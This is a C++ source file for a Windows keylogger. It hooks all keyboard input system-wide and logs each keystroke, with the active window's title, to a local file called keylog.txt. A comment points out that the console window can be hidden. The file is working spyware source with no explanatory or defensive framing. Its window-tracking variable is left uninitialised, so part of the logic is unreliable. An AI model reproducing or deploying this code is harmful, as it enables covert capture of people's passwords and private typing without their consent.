#include <stdio.h>
#include <iostream>
#include <fstream>
#include <Windows.h>

LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam);
void writeToFile(LPKBDLLHOOKSTRUCT&);
HHOOK keyboardhook;
std::ofstream textfile;

LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam){
  char  windowtitle[256];
  HWND  foregroundwindow = GetForegroundWindow();
  HWND  window;
  LPKBDLLHOOKSTRUCT keypressed = (LPKBDLLHOOKSTRUCT)lParam;

  if (window != foregroundwindow){
    textfile << std::endl;
    GetWindowText(foregroundwindow, windowtitle, 256);
    textfile << "WINDOW: " << windowtitle << std::endl << "KEYS PRESSED: ";
    window = foregroundwindow;
  }

	if (code == HC_ACTION && wParam == WM_KEYDOWN) writeToFile(keypressed);

	return CallNextHookEx(keyboardhook, code, wParam, lParam);
}

// vkCode translations: https://docs.microsoft.com/en-us/windows/desktop/inputdev/virtual-key-codes
// Does not account for every single key on the keyboard, but does account for letters, numbers and symbols
void writeToFile(LPKBDLLHOOKSTRUCT& keypress){

  char key;

  // Check if 'CAPS LOCK' is held down
  bool shift = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0);
  // Check if 'SHIFT' key is held down
  if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 || (GetKeyState(VK_LSHIFT) & 0x1000) != 0 || (GetKeyState(VK_RSHIFT) & 0x1000) != 0)  shift = !shift;

  if (keypress->vkCode == VK_SPACE)
    textfile << "[SPACE]";
  else if (keypress->vkCode == VK_SHIFT || keypress->vkCode == VK_LSHIFT || keypress->vkCode == VK_RSHIFT)
    textfile << "[SHIFT]";
  else if (keypress->vkCode == VK_BACK)
    textfile << "[BACK]";
  else if (keypress->vkCode == VK_CONTROL || keypress->vkCode == VK_LCONTROL || keypress->vkCode == VK_RCONTROL)
    textfile << "CTRL^";
  else if (keypress->vkCode == VK_RETURN)
    textfile << "[ENTER]";
  // Key pressed is one of the number keys above 'qwertyuiop'
  else if (keypress->vkCode >= 0x30 && keypress->vkCode <= 0x39){
    if (shift && keypress->vkCode == 0x30) key = ')';
    else if (shift && keypress->vkCode == 0x31) key = '!';
    else if (shift && keypress->vkCode == 0x32) key = '@';
    else if (shift && keypress->vkCode == 0x33) key = '#';
    else if (shift && keypress->vkCode == 0x34) key = '$';
    else if (shift && keypress->vkCode == 0x35) key = '%';
    else if (shift && keypress->vkCode == 0x36) key = '^';
    else if (shift && keypress->vkCode == 0x37) key = '&';
    else if (shift && keypress->vkCode == 0x38) key = '*';
    else if (shift && keypress->vkCode == 0x39) key = '(';
    else key = keypress->vkCode;
  }
  // Key pressed is in uppercase
  else if (shift && keypress->vkCode >= 65 && keypress->vkCode <= 90){
    key = keypress->vkCode;
  }
  // Key pressed is in lowercase
  else if (!shift && keypress->vkCode >= 65 && keypress->vkCode <= 90){
    key = (keypress->vkCode) + 32;
  }
  // Account for some other keys
  else{
    if (keypress->vkCode == VK_OEM_COMMA) shift == true ? key = '<' : key = ',';
    else if (keypress->vkCode == VK_OEM_PERIOD) shift == true ? key = '>' : key = '.';
    else if (keypress->vkCode == VK_OEM_MINUS) shift == true ? key = '_' : key = '-';
    else if (keypress->vkCode == VK_OEM_PLUS) shift == true ? key = '+' : key = '=';
    else if (keypress->vkCode == VK_OEM_1) shift == true ? key = ':' : key = ';';
    else if (keypress->vkCode == VK_OEM_2) shift == true ? key = '?' : key = '/';
    else if (keypress->vkCode == VK_OEM_3) shift == true ? key = '~' : key = '`';
    else if (keypress->vkCode == VK_OEM_4) shift == true ? key = '{' : key = '[';
    else if (keypress->vkCode == VK_OEM_5) shift == true ? key = '|' : key = '\\';
    else if (keypress->vkCode == VK_OEM_6) shift == true ? key = '}' : key = ']';
    else if (keypress->vkCode == VK_OEM_7) shift == true ? key = '"' : key = '\'';
  }
  textfile << key;
}

int main (){
	
	textfile.open("keylog.txt", std::ios::out | std::ios::trunc);
	printf("Hooking the keyboard...\n");
  ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 1); // 1 == Visible Window & 2 == Invisible Window
	keyboardhook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0) != 0);
	UnhookWindowsHookEx(keyboardhook);
	textfile.close();

	return 0;
}